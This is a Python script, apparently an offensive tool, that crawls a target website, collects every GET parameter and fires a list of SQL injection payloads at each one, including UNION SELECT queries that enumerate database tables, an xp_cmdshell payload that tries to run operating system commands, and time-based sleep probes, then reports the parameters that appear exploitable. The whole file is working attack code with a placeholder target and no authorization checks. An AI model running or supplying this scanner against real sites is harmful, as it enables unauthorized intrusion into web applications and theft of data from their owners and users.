import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
import re

# ===== CONFIG =====
TARGET_URL = "http://example.com"  # Replace with your target
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "admin'#",
    "' UNION SELECT null, version()--",
    "' UNION SELECT null, table_name FROM information_schema.tables--",
    "'; EXEC xp_cmdshell('dir')--",
    "'; SELECT sleep(5)--",
    "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--"
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
}

# ===== FUNCTIONS =====
def extract_links_and_params(url):
    """Extract all links and their GET parameters from a webpage."""
    try:
        response = requests.get(url, headers=HEADERS, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        links = []
        for link in soup.find_all("a", href=True):
            href = link["href"]
            absolute_url = urljoin(url, href)
            if "?" in absolute_url:
                links.append(absolute_url)
        return list(set(links))  # Remove duplicates
    except:
        return []

def get_all_params(url):
    """Extract all GET parameters from a URL."""
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    return list(params.keys())

def test_sqli(url, param):
    """Test a specific parameter for SQLi."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    vulnerable = []

    for payload in PAYLOADS:
        query_params[param] = payload
        new_query = "&".join([f"{k}={v[0]}" for k, v in query_params.items()])
        test_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))

        try:
            response = requests.get(test_url, headers=HEADERS, timeout=15)
            if ("error in your SQL syntax" in response.text.lower() or
                "unclosed quotation mark" in response.text.lower() or
                "sql syntax" in response.text.lower()):
                print(f"[✅ VULNERABLE!] {test_url} (Param: {param}, Payload: {payload})")
                vulnerable.append((test_url, param, payload))
            elif response.elapsed.total_seconds() > 5:  # Time-based check
                print(f"[🕒 POTENTIAL BLIND SQLi] {test_url} (Param: {param}, Payload: {payload})")
                vulnerable.append((test_url, param, payload))
        except:
            continue
    return vulnerable

def main():
    print("""
    ################################################
    #   Silent | ALL-PARAMETER SQLi HUNTING TOOL   #
    
    ################################################
    """)
    targets = [TARGET_URL]
    visited = set()
    vulnerable_sites = []

    while targets:
        url = targets.pop(0)
        if url in visited:
            continue
        visited.add(url)
        print(f"[🔍 SCANNING] {url}")

        # Extract all links with parameters
        new_links = extract_links_and_params(url)
        for link in new_links:
            if link not in visited and link not in targets:
                targets.append(link)

        # Test all parameters in the current URL
        params = get_all_params(url)
        for param in params:
            print(f"[🔥 TESTING PARAM] {param} in {url}")
            results = test_sqli(url, param)
            if results:
                vulnerable_sites.extend(results)

    print("\n[📜 VULNERABLE SITES & PARAMS FOUND]")
    for site, param, payload in vulnerable_sites:
        print(f"🔴 {site} (Param: {param}, Exploitable with: {payload})")

if __name__ == "__main__":
    main()
